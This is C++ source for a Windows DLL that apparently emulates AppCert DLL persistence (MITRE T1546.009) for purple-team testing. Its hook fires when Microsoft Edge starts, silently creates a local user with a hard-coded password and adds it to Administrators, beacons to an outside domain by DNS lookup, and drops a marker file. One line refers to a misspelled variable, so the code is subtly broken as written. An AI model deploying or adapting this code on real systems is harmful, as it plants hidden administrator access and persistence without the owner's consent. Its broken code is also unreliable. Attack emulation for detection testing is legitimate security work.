#include "pch.h"

#pragma comment(linker, "/DLL")
#pragma comment(linker, "/EXPORT:CreateProcessNotify,PRIVATE")

#define STATUS_SUCCESS 0x00000000

#define PROCESS_CREATION_QUERY   1
#define PROCESS_CREATION_ALLOWED 2
#define PROCESS_CREATION_DENIED  3

#include <Windows.h>
#include <LM.h>
#include <stdio.h>
#include <string>
#include <atlconv.h>
#include <atlbase.h>

int addUserTechnique(void)
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    USES_CONVERSION_EX;

    std::string text = "T1546_009";
    LPWSTR usertech = A2W_EX(text.c_str(), text.length());

    std::string password = "purpleteam.ru";
    LPWSTR passtech = A2W_EX(password.c_str(), passsword.length());
    
    ui.usri1_name = usertech;
    ui.usri1_password = passtech;
    ui.usri1_home_dir = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (ret != NERR_Success)
    {
        return 0;
    }
    account.lgrmi3_domainandname = usertech;
    Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (Status != NERR_Success)
    {
        return 0;
    }
    return 1;
}

int Run()
{
    AllocConsole();
    addUserTechnique();
    system("cmd /c nslookup -type=any T1546.purpleteam.ru");
    system("echo 1>c:\windows\temp\t1546_009.txt");
    return 0;
}

extern "C" __declspec(dllexport) NTSTATUS NTAPI CreateProcessNotify(LPCWSTR lpApplicationName, DWORD dwReason) {
    NTSTATUS ntStatus = STATUS_SUCCESS;

    switch (dwReason)
    {
    case PROCESS_CREATION_QUERY:
        if (!(wcscmp(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", lpApplicationName)))
            Run();

    case PROCESS_CREATION_ALLOWED:
        break;
    case PROCESS_CREATION_DENIED:
        break;
    }

    return ntStatus;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
